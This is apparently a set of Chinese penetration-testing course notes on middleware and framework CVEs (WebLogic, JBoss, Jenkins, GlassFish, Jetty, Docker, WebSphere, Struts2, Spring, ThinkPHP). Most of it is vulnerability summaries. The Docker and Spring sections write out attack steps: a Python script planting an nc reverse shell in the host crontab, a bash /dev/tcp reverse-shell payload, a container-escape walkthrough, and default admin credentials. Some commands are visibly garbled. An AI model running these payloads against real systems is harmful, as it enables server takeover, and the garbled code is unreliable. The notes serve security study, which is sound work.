<h1 id="第60天-服务攻防-中间件安全-CVE复现-Weblogic-Jenkins-GlassFish"><a href="#第60天-服务攻防-中间件安全-CVE复现-Weblogic-Jenkins-GlassFish" class="headerlink" title="第60天 服务攻防-中间件安全&amp;CVE复现&amp;Weblogic&amp;Jenkins&amp;GlassFish"></a>第60天 服务攻防-中间件安全&amp;CVE复现&amp;Weblogic&amp;Jenkins&amp;GlassFish</h1><h4 id="知识点：-40"><a href="#知识点：-40" class="headerlink" title="知识点："></a>知识点：</h4><p>中间件及框架列表：<br>lIS,Apache,Nginx,Tomcat,Docker,Weblogic,JBoos,WebSphere,Jenkins,<br>GlassFish,Jira,Struts2,Laravel,Solr,Shiro,Thinkphp,Sprng,Flask,jQuery<br>1、<strong>中间件-Weblogic安全</strong>            ———–感觉其中最重要的一个<br>2、中间件JB00S安全<br>3、中间件-Jenkins:安全<br>4、中间件-GlassFish安全</p>
<h4 id="章节内容：-6"><a href="#章节内容：-6" class="headerlink" title="章节内容："></a>章节内容：</h4><p>常见中间件的安全测试：<br>1、配置不当-解析&amp;弱口令<br>2、安全机制特定安全漏洞<br>3、安全机制-弱口令爆破攻击<br>4、安全应用框架特定安全漏洞</p>
<h4 id="前置知识：-9"><a href="#前置知识：-9" class="headerlink" title="前置知识："></a>前置知识：</h4><p>中间件安全侧试流程：<br>1、判断中间件信息名称&amp;版本&amp;三方<br>2、判断仲间件问题-配置不当&amp;公开漏洞<br>3、判断中间件利用-弱口令&amp;EXP&amp;框架漏洞<br>应用服务安全测试流程：见图<br>1、判断服务开放情况端口扫描&amp;组合应用等<br>2、判断服务类型归属数据库&amp;文件传输&amp;通讯等<br>3、判断服务利用方式持定漏洞&amp;未授权&amp;弱口令等</p>
<h4 id="演示案例-2"><a href="#演示案例-2" class="headerlink" title="演示案例"></a>演示案例</h4><p>中间件Weblogic-工具搜哈<br>中间件JBoos-工具脚本搜哈<br>中间件-Jenkins-工具脚本搜哈<br>中间件-GlassFish-工具脚本搜哈<br>配合下-FofaViewer-.工具脚本搜哈</p>
<h5 id="1、中间件-Weblogic-CVE-反序列化-远程执行"><a href="#1、中间件-Weblogic-CVE-反序列化-远程执行" class="headerlink" title="1、中间件-Weblogic-CVE&amp;反序列化&amp;远程执行"></a>1、中间件-Weblogic-CVE&amp;反序列化&amp;远程执行</h5><p>​        简介：Weblogic 是 Oracle 公司推出的一个基于JAVAEE架构的中间件，能为JAVA程序提供开发、集成、部署和管理等功能。</p>
<p>注：由于下面的几个漏洞大部分可直接用集成工具一键探测并利用，因此下面只介绍漏洞详情，就不复现了，下载链接如下：</p>
<p>WeblogicTool-GUI漏洞利用工具<a target="_blank" rel="noopener" href="https://github.com/KimJun1010/WeblogicTool">https://github.com/KimJun1010/WeblogicTool</a> ，支持漏洞检测、命令执行、内存马注入、密码解密等</p>
<p>此工具需要在java8环境下运行，检查java版本</p>
<h6 id="（1）-CVE-2017-3506-远程代码执行漏洞"><a href="#（1）-CVE-2017-3506-远程代码执行漏洞" class="headerlink" title="（1） CVE-2017-3506  远程代码执行漏洞"></a>（1） CVE-2017-3506  远程代码执行漏洞</h6><p>简介：</p>
<pre><code>    Weblogic的WLS Security组件对外提供webservice服务 ，里面的XMLDecoder是用来解析用户传入的数据，解析的过程中，由于其中的WorkContextXmlInputAdapter类没有限制传入的数据，会出现反序列化漏洞，导致可执行任意命令，因此可被攻击者构造恶意代码拿到权限。
</code></pre>
<p>影响版本：</p>
<pre><code>    OracleWebLogic Server10.3.6.0.0

    OracleWebLogic Server12.1.3.0.0

    OracleWebLogic Server12.2.1.1.0

    OracleWebLogic Server12.2.1.2.0
</code></pre>
<p>判断方法：</p>
<pre><code>    访问以下目录，页面有返回服务信息则说明或许存在漏洞
</code></pre>
<blockquote>
<p>&#x2F;wls-wsat&#x2F;CoordinatorPortType</p>
<p>&#x2F;wls-wsat&#x2F;RegistrationPortTypeRPC</p>
<p>&#x2F;wls-wsat&#x2F;ParticipantPortType</p>
<p>&#x2F;wls-wsat&#x2F;RegistrationRequesterPortType<br>&#x2F;wls-wsat&#x2F;CoordinatorPortType11</p>
<p>&#x2F;wls-wsat&#x2F;RegistrationPortTypeRPC11<br>&#x2F;wls-wsat&#x2F;ParticipantPortType11</p>
<p>&#x2F;wls-wsat&#x2F;RegistrationRequesterPortType11</p>
</blockquote>
<h6 id="（2）CVE-2018-2893-反序列化漏洞"><a href="#（2）CVE-2018-2893-反序列化漏洞" class="headerlink" title="（2）CVE-2018-2893  反序列化漏洞"></a>（2）CVE-2018-2893  反序列化漏洞</h6><p>简介：</p>
<pre><code>    此漏洞产生于WebLogic T3服务，T3协议在WebLogic Server和客户端间承当传输数据和通信作用，Weblogic开放端口后T3会默认开启，WebLogic服务存在的漏洞允许未经身份验证的攻击者通过T3获得服务器权限。
</code></pre>
<p>影响版本：</p>
<pre><code>    WebLogic 10.3.6.0

    WebLogic 12.1.3.0

    WebLogic 12.2.1.2

    WebLogic 12.2.1.3
</code></pre>
<h6 id="（3）CVE-2018-3245-远程代码执行漏洞"><a href="#（3）CVE-2018-3245-远程代码执行漏洞" class="headerlink" title="（3）CVE-2018-3245  远程代码执行漏洞"></a>（3）CVE-2018-3245  远程代码执行漏洞</h6><p>简介：</p>
<pre><code>    该漏洞和CVE-2018-2893类似，通过JRMP协议利用RMI机制的缺陷,进行远程代码执行漏洞的利用。攻击者可构造恶意代码并通过T3进行反序列化实现远程代码执行获取系统权限。
</code></pre>
<p>影响版本：</p>
<pre><code>    Weblogic 10.3.6.0

    Weblogic 12.1.3.0

    Weblogic 12.2.1.3
</code></pre>
<p>判断方法：</p>
<pre><code>    CVE-2018-3245-PoC
</code></pre>
<h6 id="（4）CVE-2020-14882-未授权命令执行漏洞"><a href="#（4）CVE-2020-14882-未授权命令执行漏洞" class="headerlink" title="（4）CVE-2020-14882 未授权命令执行漏洞"></a>（4）CVE-2020-14882 未授权命令执行漏洞</h6><p>简介：</p>
<pre><code>    此漏洞可被未经身份验证的攻击者通过构造特殊的GET请求进行攻击，
</code></pre>
<p>影响版本：</p>
<pre><code>    Oracle Weblogic Server 10.3.6.0.0

    Oracle Weblogic Server 12.1.3.0.0

    Oracle Weblogic Server 12.2.1.3.0

    Oracle Weblogic Server 12.2.1.4.0

    Oracle Weblogic Server 14.1.1.0.0
</code></pre>
<p>WeblogicTool可以识别存在漏洞，但是利用这块用不了，尝试手工复现下</p>
<p>打开vulhub，进入&#x2F;weblogic&#x2F;CVE-2020-14882，启动容器</p>
<p>打开访问界面<a target="_blank" rel="noopener" href="http://192.168.190.153:7001/console">http://192.168.190.153:7001/console</a></p>
<p>输入poc，可直接进入后台,说明存在漏洞</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">这个在最近打的一个渗透靶场中也出现了好几题相关的题目，虽然可以绕过直接进入后台，但只是低权限用户，并没有什么太大作用，主要漏洞点一般情况下载另一个界面中的ssrf漏洞</span><br><span class="line">http://175.27.135.16:7001/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=127.0.0.1:7000</span><br></pre></td></tr></table></figure>

<p>参考链接：<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2202740">https://cloud.tencent.com/developer/article/2202740</a> </p>
<h6 id="（5）CVE-2021-2394-反序列化漏洞"><a href="#（5）CVE-2021-2394-反序列化漏洞" class="headerlink" title="（5）CVE-2021-2394 反序列化漏洞"></a>（5）CVE-2021-2394 反序列化漏洞</h6><p>简介：</p>
<pre><code>    此为WebLogic组件存在高危漏洞，漏洞主要是FilterExtractor的readExternal方法使用不当，使得生成 MethodAttributeAccessor的时候不会受到黑名单的限制。成功利用该漏洞的攻击者可以获取WebLogic Server管理权限。
</code></pre>
<p>影响版本：</p>
<pre><code>    Oracle WebLogic Server 10.3.6.0.0

    Oracle WebLogic Server 12.1.3.0.0

    Oracle WebLogic Server 12.2.1.3.0

    Oracle WebLogic Server 12.2.1.4.0

    Oracle WebLogic Server 14.1.1.0.0
</code></pre>
<p>这里用vulhub的CVE-2020-14882的漏洞环境来代替（版本一致）</p>
<p>可以直接使用工具去连接存在漏洞的页面，从而直接可以达到命令执行的效果。</p>
<h5 id="2、中间件-JBoos-CVE-弱口令"><a href="#2、中间件-JBoos-CVE-弱口令" class="headerlink" title="2、中间件-JBoos-CVE&amp;弱口令"></a>2、中间件-JBoos-CVE&amp;弱口令</h5><p>简介：</p>
<pre><code>    Jboss 通常占用的端口是 1098，1099，4444，4445，8080，8009，8083，8093 这
</code></pre>
<p>几个，Red Hat JBoss Application Server 是一款基于 JavaEE 的开源应用服务器。</p>
<p>（1）CVE-2017-12149  反序列化远程代码执行漏洞</p>
<p>简介：</p>
<pre><code>    JBOSS Application Server是一个基于JE22的开放源代码的应用服务器，在这个漏洞中，发现 HTTP Invoker 的 ReadOnlyAccessFilter 中的 doFilter 方法不限制它执行反序列化的类，因此允许攻击者通过构建特殊的的序列化数据执行任意代码，无需用户验证即可获得服务器的控制权。
</code></pre>
<p>影响版本：</p>
<pre><code>    5.x和6.x版本的JBOSSAS
</code></pre>
<h6 id="（2）CVE-2017-7504-反序列化命令执行漏洞"><a href="#（2）CVE-2017-7504-反序列化命令执行漏洞" class="headerlink" title="（2）CVE-2017-7504  反序列化命令执行漏洞"></a>（2）CVE-2017-7504  反序列化命令执行漏洞</h6><p>简介：</p>
<pre><code>    Jboss AS 4.X及之前的版本中的JbossMQ实现过程的JMS over HTTP Invocation Layer的HTTPServerILServlet.java文件存在安全漏洞。远程攻击者可借助特制的序列化数据利用该漏洞执行任意代码。
</code></pre>
<p>影响版本：</p>
<pre><code>    JBoss AS&lt;=4.x
</code></pre>
<h6 id="3）弱口令-未授权访问"><a href="#3）弱口令-未授权访问" class="headerlink" title="3）弱口令 未授权访问"></a>3）弱口令 未授权访问</h6><p>简介：</p>
<p>​    部署jboss时管理员有时会忽略修改密码导致弱口令，又或者无密码可以直接访问后台导致未授权访问。</p>
<p>影响版本：</p>
<p>​    全版本</p>
<h5 id="3、中间件-Jenkins-CVE"><a href="#3、中间件-Jenkins-CVE" class="headerlink" title="3、中间件-Jenkins-CVE"></a>3、中间件-Jenkins-CVE</h5><p>简介：</p>
<p>​    Jenkins 是一个用 Java 编写的开源自动化工具，是基于Java开发的一种持续集成工具，用于监控持续重复的工作。默认端口:8080</p>
<h6 id="（1）CVE-2017-1000353-远程代码执行漏洞"><a href="#（1）CVE-2017-1000353-远程代码执行漏洞" class="headerlink" title="（1）CVE-2017-1000353  远程代码执行漏洞"></a>（1）CVE-2017-1000353  远程代码执行漏洞</h6><p>简介：</p>
<pre><code>    该漏洞存在于使用HTTP协议的双向通信通道的具体实现代码中，Jenkins利用此通道来接收命令，恶意攻击者可以构造恶意攻击参数远程执行命令，从而获取系统权限，造成数据泄露。
</code></pre>
<p>影响版本：</p>
<pre><code>    所有Jenkins主版本均受到影响(包括&lt;=2.56版本)
    所有Jenkins LTS 均受到影响(包括&lt;=2.46.1版本)
</code></pre>
<h6 id="（2）CVE-2018-1000861-远程命令执行漏洞-（未完成）"><a href="#（2）CVE-2018-1000861-远程命令执行漏洞-（未完成）" class="headerlink" title="（2）CVE-2018-1000861  远程命令执行漏洞 （未完成）"></a>（2）CVE-2018-1000861  远程命令执行漏洞 （未完成）</h6><p>简介：</p>
<pre><code>    jenkins使用Stapler开发，在stapler/core/src/main/java/org/kohsuke/stapler/MetaClass.java 中使用的 Stapler Web 框架中存在一个代码执行漏洞，该漏洞允许攻击者通过访问构建特殊的 URL 来调用 Java 对象上的某些方法获取权限。
</code></pre>
<p>影响版本：</p>
<pre><code>    Jenkins主版本 &lt;= 2.153
    Jenkins LTS版本 &lt;= 2.138.3
</code></pre>
<h6 id="3）CVE-2019-100300-远程代码执行漏洞（条件苛刻）"><a href="#3）CVE-2019-100300-远程代码执行漏洞（条件苛刻）" class="headerlink" title="3）CVE-2019-100300  远程代码执行漏洞（条件苛刻）"></a>3）CVE-2019-100300  远程代码执行漏洞（条件苛刻）</h6><p>简介：</p>
<pre><code>    在src/main/java/org/jenkinsci/plugins/scriptsecurity/sandbox/groovy/GroovySandbox.java 中存在一个沙盒绕过漏洞，该漏洞允许能提供沙盒脚本的攻击者在 Jenkins master JVM 上执行任意代码。
</code></pre>
<p>影响版本：</p>
<pre><code>    Pipeline: Declarative 插件 &lt;= 1.3.4
    Pipeline: Groovy 插 件 &lt;= 2.61
    Script Security 插 件 &lt;= 1.49
</code></pre>
<p>该漏洞需要提前知道管理员用户账号和密码才能进行利用，利用价值不高</p>
<h5 id="4、中间件-GlassFish-CVE"><a href="#4、中间件-GlassFish-CVE" class="headerlink" title="4、中间件-GlassFish-CVE"></a>4、中间件-GlassFish-CVE</h5><p>简介：</p>
<pre><code>    GlassFish 是一款强健的商业兼应用服务器，达到产品级质量，可免费用于开发、部署和重新分发。开发者可以免费获得源代码，还可以对代码进行更改。默认端口为4848。
</code></pre>
<h6 id="（1）CVE-2017-1000028-任意文件读取漏洞"><a href="#（1）CVE-2017-1000028-任意文件读取漏洞" class="headerlink" title="（1）CVE-2017-1000028 任意文件读取漏洞"></a>（1）CVE-2017-1000028 任意文件读取漏洞</h6><p>简介：</p>
<pre><code>    Oracle 的 GlassFish Server Open Source Edition 4.1 容易受到经过身份验证和未经身份验证的目录遍历漏洞的攻击，可以通过发出特制的 HTTP GET 请求来利用该漏洞。
</code></pre>
<p>影响版本：</p>
<pre><code>   GlassFish &lt;= 4.1.2
</code></pre>
<h6 id="（2）简单口令-Getshell-（getshell失败）"><a href="#（2）简单口令-Getshell-（getshell失败）" class="headerlink" title="（2）简单口令&amp;Getshell （getshell失败）"></a>（2）简单口令&amp;Getshell （getshell失败）</h6><p>简介：</p>
<p>​    部署Glassfish时管理员有时会忽略修改密码导致弱口令，又或者无密码可以直接访问后台导致未授权访问。</p>
<p>影响版本：</p>
<p>​    全版本 </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">附加：主要其实就是Weblogic个人感觉更为常见点，所以对于其他的中间件就没做太过多的收集，都是一些相关CVE，使用搜索引擎也很容易去搜到相关的poc</span><br></pre></td></tr></table></figure>

<h1 id="第61天-服务攻防-中间件安全-CVE复现-K8S-Docker-Jetty-Websphere"><a href="#第61天-服务攻防-中间件安全-CVE复现-K8S-Docker-Jetty-Websphere" class="headerlink" title="第61天 服务攻防-中间件安全&amp;CVE复现&amp;K8S&amp;Docker&amp;Jetty&amp;Websphere"></a>第61天 服务攻防-中间件安全&amp;CVE复现&amp;K8S&amp;Docker&amp;Jetty&amp;Websphere</h1><h4 id="知识点：-41"><a href="#知识点：-41" class="headerlink" title="知识点："></a>知识点：</h4><p>中间件及框架列表：<br>lIS,Apache,Nginx,Tomcat,Docker,Weblogic,JBoos,WebSphere,Jenkins,<br>GlassFish,Jira,Struts2,Laravel,Solr,Shiro,Thinkphp,Sprng,Flask,jQuery<br>0、中间件-K8s安全<br>1、中间件Jey安全<br>2、中间件-Docker安全<br>3.中间件-WebSphere:安全</p>
<h4 id="章节内容：-7"><a href="#章节内容：-7" class="headerlink" title="章节内容："></a>章节内容：</h4><p>常见中间件的安全测试：<br>1、配置不当-解析&amp;弱口令<br>2、安全机制特定安全漏洞<br>3、安全机制-弱口令爆破攻击<br>4、安全应用框架特定安全漏洞</p>
<h4 id="前置知识：-10"><a href="#前置知识：-10" class="headerlink" title="前置知识："></a>前置知识：</h4><p>中间件安全侧试流程：<br>1、判断中间件信息名称&amp;版本&amp;三方<br>2、判断中间件问题-配置不当&amp;公开漏洞<br>3、判断中间件利用-弱口令&amp;EXP&amp;框架漏洞<br>应用服务安全测试流程：见图<br>1、判断服务开放情况端口扫描&amp;组合应用等<br>2、判断服务类型归属数据库&amp;文件传输&amp;通讯等<br>3、判断服务利用方式持定漏洞&amp;未授权&amp;弱口令等</p>
<h4 id="演示案例-3"><a href="#演示案例-3" class="headerlink" title="演示案例"></a>演示案例</h4><p>中间件K8s-搜哈<br>中间件Jety-搜哈<br>中间件Docker-搜哈<br>中间件-WebSphere-搜哈<br>配合下-Fofa_Viewer-搜哈</p>
<p>中间件-K8s-搜哈<br>kubernetest简称k8s,是一个由google开源的，用于自动部暑，扩展和管理容器化应用程序的开源系统。在B站内部，k8s在管理生产级容器和应用服务部署已经有较为广泛和成熟的应用。通过kK8$,可跨多台主机进行容器编排、快速按需扩展容器应用及其资源、对应<br>用实施状况检查、服务发现和负载均衡街等。<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/w1590191166/article/details/122028001">https://blog.csdn.net/w1590191166/article/details/122028001</a></p>
<p>中间件Jetty-搜哈<br>Elipse Jetty是一个开源的servlet容器，它为基于Java的Web容器提供运行环境。<br>CVE-2021-28164<br><a target="_blank" rel="noopener" href="http://123.58.236.76.63126/WEB-INF/web.Xxml">http://123.58.236.76.63126/%2e/WEB-INF/web.Xxml</a><br>CVE-2021-28169<br><a target="_blank" rel="noopener" href="http://123.58.236.76:63126/static?/WEB-INF/web.xml">http://123.58.236.76:63126/static?/WEB-INF/web.xml</a><br>CVE-2021-34429<br>http:&#x2F;123.58.236.76:63126&#x2F;%u002eWEB-NF&#x2F;web.xml</p>
<p>中间件-Docker-搜哈<br>Docker容器是使用沙盒机制，是单独的系统，理论上是很安全的，通过利用某种手段，再结合执行POC或EXP,就可以返回一个宿主机的高权限Shll,并拿到宿主机的root权限，可以直接操作宿主机文件。它从容器中逃了出来，因此我们形象的称为Dockeri逃逸漏洞。<br>1、容器判断：判断当前是否是容器环境<br>-是否存在.dockerenv文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Is -alh /.dockerenv</span><br></pre></td></tr></table></figure>

<p>查间系统进程的cgroup信息：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/1/cgroup</span><br></pre></td></tr></table></figure>

<p>2、容器逃逸漏洞：权限提升<br>-由两核漏洞引起一DirtyC0W(CVE-2016-5195)<br>-由Docker软件设计引起CVE-2019-5736、CVE-2019-14271,CVE-2020-15257<br>由配置不当引起一开启privileged（特权模式）+宿主机目录挂载（文件挂载）、功能<br>(capabilities)机制、sock通信方式<br>CVE-2016-5195<br><a target="_blank" rel="noopener" href="https://github.com/gebl/dirtycow-docker-vdso">https://github.com/gebl/dirtycow-docker-vdso</a><br><a target="_blank" rel="noopener" href="https://www.ichunqiu.com/experiment/catalog?id=100295">https://www.ichunqiu.com/experiment/catalog?id=100295</a><br>第一步、启动容器：<br>#使用本地1234端口连接docker的1234端口运行dirtycow镜像，并将其临时命名为test<br>#其中test:为临时名称，可以自定义填写。p:第一个端口为本机的端口，第二个端口<br>为Docker的端口。-td:意思是在后台运行，交互式运行，并且输出当前的信息<br>bin&#x2F;bash:调用Shel</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run --name=test-p 1234:1234 -itd dirtycow /bin/bash</span><br></pre></td></tr></table></figure>

<p>第二部、进入容器：<br>#进入镜像内部</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker exec-it test /bin/bash</span><br></pre></td></tr></table></figure>

<p>第三步、<br>#编译并运行POC</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /dirtycow-vdso/</span><br><span class="line">make</span><br><span class="line">/0xdeadbeef</span><br></pre></td></tr></table></figure>

<p>执行操作即可作用宿主机</p>
<p>-CVE-2019-5736<br>参考：https:&#x2F;&#x2F;&#x2F;blog.51cto.com&#x2F;u_15060465&#x2F;4336524<br>复现：curl<br><a target="_blank" rel="noopener" href="https://aist_githubusercontent.com/thinkycx/e2c9090f035d7b09156077903d6afa51/raw">https://aist_githubusercontent.com/thinkycx/e2c9090f035d7b09156077903d6afa51/raw</a> -o<br>install.sh &amp;bash install.sh<br>1、下载POC</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/Frichetten/CVE-2019-5736-PoC</span><br></pre></td></tr></table></figure>

<p>2、修改编译生成payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CGO ENABLED=0 GOOS=linux GOARCH=amd64 go build main.go</span><br></pre></td></tr></table></figure>

<p>2、修改编译生成payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CGO ENABLED=0 GOOS=linux GOARCH=amd64 go build main.go</span><br></pre></td></tr></table></figure>


<p>3.将该payload拷贝到docker容器中（此时可以模拟攻击者获取了docker容器权限，在容器<br>中上传payload进行dockeri逃逸）并执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker cp main ecca872da49d:/home</span><br><span class="line">docker exec-it ecca872da49d bash</span><br><span class="line">cd /home/</span><br><span class="line">chmod 777 main</span><br><span class="line">/main</span><br></pre></td></tr></table></figure>

<p>4、再次进入docker镜像后监听即可收到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker exec-t镜像ID bash</span><br><span class="line">nc -lwvp</span><br></pre></td></tr></table></figure>

<p>3、容器安全漏洞<br>docker未授权访问漏洞-vulhub-exp.py</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import docker</span><br><span class="line">client docker.DockerClient(base_url=&#x27;http://IP:2375/)</span><br><span class="line">data=client.containers.run(alpine:latest&#x27;,r&quot;sh-c&quot;echousr/bin/nc反弹IP端☐-e</span><br><span class="line">bin/sh&#x27;&gt;&gt;/tmp/etc/crontabs/root&quot;&quot;,remove=True,volumes=f/etc&quot;:(bind&#x27;:&#x27;/tmp/etc&#x27;,</span><br><span class="line">&#x27;mode&#x27;:&#x27;nw)))</span><br></pre></td></tr></table></figure>

<p>中间件-WebSphere-搜哈<br>WebSphere@Application Server加速交付新应用程序和服务，它可以通过快速交付创新<br>的应用程序来帮助企业提供丰富的用户体验从基于开放标准的丰富的编程模型中进行选<br>择，以便更好地协调项目需求与编程模型功能和开发人员技能。<br>端口：9080一web(http)应用访问端口、9443-web(https)应用访i问端口、9060一管理后台<br>访问端口、9043一管理控制台安全端口、8880一SOAP连接器端口等等。<br>漏洞探测在8880满口，后台是9060端口，解析是9080端口<br>拉取镜像：docker pull iscrosales&#x2F;websphere7<br>启动镜像：docker run-d-p9060:9060-p9043:9043-p8880:8880-p9080:9080<br>iscrosales&#x2F;websphere7<br>停止镜像：docker stop $(docker ps-aq)<br>1、CVE-2015-7450反序列化<br>工具搜哈：<a target="_blank" rel="noopener" href="http://147.94.236.117:8880/">http://147.94.236.117:8880/</a><br>2、弱☐令上传拿Shell<br>-在6x至7.0版本，后台登陆只需要输入admin作为用户标识，无需密码，即可登陆后台。<br>-websphere&#x2F;websphere<br>-system&#x2F;manager<br>访i问：http:147.94.236.117:9060&#x2F;<br>登录：admin<br>上传：war马<br>启动：1_war<br>连接：<a target="_blank" rel="noopener" href="http://47.94.236.117:9080/1/1jsp">http://47.94.236.117:9080/1/1jsp</a><br>3、CVE-2020-4450:无利用P0C&#x2F;EXP</p>
<h1 id="第62天-服务攻防-框架安全-CVE复现-Spring-Struts-Laravela-ThinkPHP"><a href="#第62天-服务攻防-框架安全-CVE复现-Spring-Struts-Laravela-ThinkPHP" class="headerlink" title="第62天 服务攻防-框架安全&amp;CVE复现&amp;Spring&amp;Struts&amp;Laravela&amp;ThinkPHP"></a>第62天 服务攻防-框架安全&amp;CVE复现&amp;Spring&amp;Struts&amp;Laravela&amp;ThinkPHP</h1><h4 id="知识点：-42"><a href="#知识点：-42" class="headerlink" title="知识点："></a>知识点：</h4><p>中间件及框架列表：<br>IIS,Apache,Nginx,Tomcat,Docker,K8s,Weblogic.JBoos,WebSphere,<br>Jenkins,GlassFish,Jetty,Jira,Struts2,Laravel,Solr,Shiro,Thinkphp,Spring,<br>Flask,jQuery等<br>1、开发框架-PHP-Laravel-Thinkphp<br>2、开发框架-Javaweb-St2-Spring<br>3.开发框架-Python-django-Flask<br>4、开发框架-Javascript-Node.js-JQuery</p>
<h4 id="常见语言开发框架："><a href="#常见语言开发框架：" class="headerlink" title="常见语言开发框架："></a>常见语言开发框架：</h4><p>PHP:Thinkphp Laravel YIl Codelgniter CakePHP Zend<br>JAVA:Spring MyBatis Hibernate Struts2 Springboot<br>Python:Django Flask Bottle Turbobars Tornado Web2py<br>Javascript:Vue.js Node.js Bootstrap JQuery Angular</p>
<h4 id="章节内容：-8"><a href="#章节内容：-8" class="headerlink" title="章节内容："></a>章节内容：</h4><p>常见中间件的安全测试：<br>1、配置不当-解析&amp;弱口令<br>2、安全机制特定安全漏洞<br>3、安全机制弱口令爆破攻击<br>4、安全应用-框架特定安全漏洞</p>
<h4 id="前置知识：-11"><a href="#前置知识：-11" class="headerlink" title="前置知识："></a>前置知识：</h4><p>,中间件安全测试流程：<br>1、判断中间件信息名称&amp;版本&amp;三方<br>2、判断中间件问题-配置不当&amp;公开漏洞<br>3、判断中间件利用-弱口令&amp;EXP&amp;框架漏洞</p>
<p>应用服务安全测试流程：见图<br>1、判断服务开放情况-端口扫描&amp;组合应用等<br>2、判断服务类型归属数据库&amp;文件传输&amp;通讯等<br>3、判断服务利用方式特定漏洞&amp;未授权&amp;弱口令等</p>
<p>开发框架组件安全测试流程：<br>1、判断常见语言开发框架类型<br>2、判断开发框架存在的CVE问题<br>3、判断开发框架CVE漏洞利用方式</p>
<h4 id="演示案例：-36"><a href="#演示案例：-36" class="headerlink" title="演示案例："></a>演示案例：</h4><p>PHP-开发框架安全-Thinkphp&amp;Laravel<br>JAVAWEB-开发框架安全-Spring&amp;Struts2</p>
<h5 id="PHP-开发框架安全-Thinkphp-Laravel"><a href="#PHP-开发框架安全-Thinkphp-Laravel" class="headerlink" title="PHP-开发框架安全-Thinkphp&amp;Laravel"></a>PHP-开发框架安全-Thinkphp&amp;Laravel</h5><p>-Laravel是一套简洁、优雅的PHP Web开发框架PHP Web Framework).<br>CVE-2021-3129RCE<br>Laravel &lt;8.4.2<br><a target="_blank" rel="noopener" href="https://github.com/zhzyker/CVE-2021-3129">https://github.com/zhzyker/CVE-2021-3129</a><br><a target="_blank" rel="noopener" href="https://github.com/SecPros-Team/laravel-CVE-2021-3129-EXP">https://github.com/SecPros-Team/laravel-CVE-2021-3129-EXP</a><br>漏洞复现：<br>使用exp一步Thinkphp-3.X RCE-5.X RCE 脚本小子上线<br>ThinkPHP是一套开源的、基于PHP的轻量级Web应用开发框架<br>武器库-Thinkphp专检写入shell，使用哥斯拉连接</p>
<h5 id="JAVAWEB-开发框架安全-Spring-Struts2"><a href="#JAVAWEB-开发框架安全-Spring-Struts2" class="headerlink" title="JAVAWEB-开发框架安全-Spring&amp;Struts2"></a>JAVAWEB-开发框架安全-Spring&amp;Struts2</h5><p>Struts:2是一个基于MvC设计模式的Web应用框架</p>
<h6 id="1、2020前漏洞-复现"><a href="#1、2020前漏洞-复现" class="headerlink" title="1、2020前漏洞 复现"></a>1、2020前漏洞 复现</h6><p>武器库-S2专检</p>
<h6 id="2、cve-2020-17530-复现"><a href="#2、cve-2020-17530-复现" class="headerlink" title="2、cve_2020_17530 复现"></a>2、cve_2020_17530 复现</h6><p>脚本：<a target="_blank" rel="noopener" href="https://github.com/YanMu.2020/s2-062">https://github.com/YanMu.2020/s2-062</a><br>手工：</p>
<h6 id="3、cve2021-31805"><a href="#3、cve2021-31805" class="headerlink" title="3、cve2021_31805"></a>3、cve2021_31805</h6><p><a target="_blank" rel="noopener" href="https://github.com/YanMu2020/s2-062">https://github.com/YanMu2020/s2-062</a></p>
<h5 id="Spring框架是由于软件开发始的复杂性而创建的。"><a href="#Spring框架是由于软件开发始的复杂性而创建的。" class="headerlink" title="Spring框架是由于软件开发始的复杂性而创建的。"></a>Spring框架是由于软件开发始的复杂性而创建的。</h5><h6 id="1-cve-2017-4971-Spring-Web-Flow-vulfocus"><a href="#1-cve-2017-4971-Spring-Web-Flow-vulfocus" class="headerlink" title="1,cve_2017_4971-Spring Web Flow vulfocus"></a>1,cve_2017_4971-Spring Web Flow vulfocus</h6><p>Spring WebFlow 2.4.0-2.4.4<br><a target="_blank" rel="noopener" href="https://paper.seebug.org/322/">https://paper.seebug.org/322/</a><br>_eventld_confirm&#x3D;&amp;csrf&#x3D;e06e1d86-e083-45f7-<br>b700-567b5f7f5d30&amp;(new+java.lang.ProcessBuilder(“bash”,“-c”,”bash±<br>i+&gt;%26+&#x2F;dev&#x2F;tcp&#x2F;47.94.236.117&#x2F;5566+0&gt;%261).stat0&#x3D;vulhub</p>
